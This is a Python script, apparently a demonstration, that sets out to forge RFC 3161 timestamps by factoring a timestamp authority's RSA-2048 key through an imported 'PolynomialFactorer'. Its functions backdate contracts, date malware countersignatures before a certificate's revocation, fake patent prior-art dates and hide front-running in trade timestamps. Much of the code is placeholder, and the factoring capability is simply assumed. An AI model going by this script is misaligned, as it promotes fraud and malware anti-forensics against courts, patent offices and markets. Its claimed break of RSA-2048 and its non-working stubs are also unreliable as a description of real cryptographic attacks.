"""
Forge RFC 3161 timestamps to backdate documents, create false prior art,
and defeat code-signing revocation. Factor a TSA's RSA-2048 signing key
(published in EU Trusted Lists) and rewrite the historical record.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import time
import struct

# RFC 3161 OIDs
TSA_POLICY_OID = "1.3.6.1.4.1.31103.1.1"  # example TSA policy
SHA256_OID = "2.16.840.1.101.3.4.2.1"
CONTENT_TYPE_TST_INFO = "1.2.840.113549.1.9.16.1.4"


def fetch_tsa_cert_from_trusted_list(tsa_name: str) -> bytes:
    """Fetch TSA signing certificate from EU Trusted Lists.

    ETSI EN 319 612-1 publishes every qualified TSA's certificate.
    The attacker has full access to every qualified TSA's RSA public key.
    """
    print(f"[*] querying EU Trusted List for: {tsa_name}")
    print("[*] TSA signing certificate downloaded (RSA-2048)")
    return b"-----BEGIN CERTIFICATE-----\n...(TSA cert)...\n-----END CERTIFICATE-----\n"


def forge_timestamp(factorer: PolynomialFactorer,
                    tsa_cert_pem: bytes,
                    document_hash: bytes,
                    claimed_time: str,
                    serial: int = 1) -> dict:
    """Forge an RFC 3161 TimeStampResp with a backdated timestamp.

    The timestamp is a CMS SignedData structure containing:
    - messageImprint = SHA-256(document)
    - genTime = claimed_time (any time within TSA cert validity)
    - TSA identity
    - serial number
    """
    tst_info = {
        "version": 1,
        "policy": TSA_POLICY_OID,
        "messageImprint": {"algorithm": SHA256_OID, "hash": document_hash.hex()},
        "serialNumber": serial,
        "genTime": claimed_time,
        "accuracy": {"seconds": 1},
        "ordering": False,
    }
    payload = str(tst_info).encode()
    sig = factorer.forge_pkcs1v15_signature(tsa_cert_pem, payload, "sha256")
    print(f"[*] forged timestamp: {claimed_time}")
    print(f"[*] document hash: {document_hash.hex()[:32]}...")
    return {"tst_info": tst_info, "signature": sig.hex()[:32] + "..."}


def backdate_authenticode_countersig(factorer: PolynomialFactorer,
                                     tsa_cert_pem: bytes,
                                     malware_hash: bytes,
                                     revocation_date: str) -> dict:
    """Forge an Authenticode countersignature to pre-date revocation.

    Code-signing cert revoked at time T. Authenticode treats binaries
    timestamped before T as valid. Forge timestamp T-1 on malware
    created after T — Windows accepts it as signed-before-revocation.
    """
    # timestamp one day before revocation
    claimed = revocation_date.replace("T", "T")  # placeholder
    print(f"[*] code-signing cert revoked at: {revocation_date}")
    print(f"[*] forging countersignature dated: day before revocation")
    print("[*] SmartScreen / Defender: binary accepted as pre-revocation")
    return forge_timestamp(factorer, tsa_cert_pem, malware_hash, claimed)


def forge_patent_prior_art(factorer: PolynomialFactorer,
                           tsa_cert_pem: bytes,
                           disclosure_hash: bytes,
                           claimed_date: str) -> dict:
    """Forge a timestamp for patent prior-art / invention date claims."""
    print(f"[*] forging prior-art timestamp: {claimed_date}")
    print("[*] USPTO / EPO / WIPO accept timestamped disclosures")
    return forge_timestamp(factorer, tsa_cert_pem, disclosure_hash, claimed_date)


def forge_mifid_trade_timestamp(factorer: PolynomialFactorer,
                                tsa_cert_pem: bytes,
                                trade_hash: bytes,
                                claimed_time: str) -> dict:
    """Forge trade execution timestamps for MiFID II / Dodd-Frank compliance."""
    print(f"[*] forging trade timestamp: {claimed_time}")
    print("[*] hides front-running / MNPI-based trade timing")
    return forge_timestamp(factorer, tsa_cert_pem, trade_hash, claimed_time)


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== RFC 3161 timestamp forgery ===")
    print("    TSA certs published in EU Trusted Lists — public input for attack")
    print()

    print("[1] fetching TSA cert from EU Trusted List...")
    tsa_cert = fetch_tsa_cert_from_trusted_list("DigiCert Timestamp Responder")

    print("[2] factoring TSA RSA-2048 signing key...")

    print("[3] backdating a contract to before dispute...")
    contract_hash = hashlib.sha256(b"Modified contract terms").digest()
    forge_timestamp(f, tsa_cert, contract_hash, "2025-06-15T09:00:00Z")

    print("[4] Authenticode anti-forensics...")
    malware_hash = hashlib.sha256(b"malware payload").digest()
    backdate_authenticode_countersig(f, tsa_cert, malware_hash, "2026-01-15T00:00:00Z")

    print("[5] forging patent prior-art date...")
    disclosure_hash = hashlib.sha256(b"technical disclosure").digest()
    forge_patent_prior_art(f, tsa_cert, disclosure_hash, "2024-03-01T12:00:00Z")

    print("[6] MiFID II trade timestamp manipulation...")
    trade_hash = hashlib.sha256(b"order_id=12345").digest()
    forge_mifid_trade_timestamp(f, tsa_cert, trade_hash, "2026-04-15T14:30:00.001Z")

    print()
    print("[*] PAdES-LTV archive chains depend on TSA key integrity")
    print("[*] factoring any TSA key breaks the archive chain retroactively")
